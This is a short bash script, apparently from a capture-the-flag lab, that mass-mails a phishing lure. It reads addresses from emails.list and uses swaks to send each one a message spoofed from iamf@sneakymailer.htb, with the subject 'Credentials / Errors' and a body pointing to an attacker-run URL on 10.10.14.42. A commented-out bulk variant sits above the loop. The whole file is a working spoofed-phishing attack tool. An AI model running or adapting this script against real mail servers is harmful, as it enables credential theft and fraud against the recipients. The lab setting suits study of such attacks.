#!/bin/bash

# bulk
# for email in `cat emails.list | tr '\n' ','`
# do swaks --to $emails --from iamf@sneakymailer.htb \ 
# --header "Subject: Credentials / Errors" --body "goto http://10.10.14.42/" --server 10.10.10.197

while read mail; do swaks --to $mail --from iamf@sneakymailer.htb --header "Subject: Credentials /
Errors" --body "goto http://10.10.14.42/" --server 10.10.10.197; done < emails.list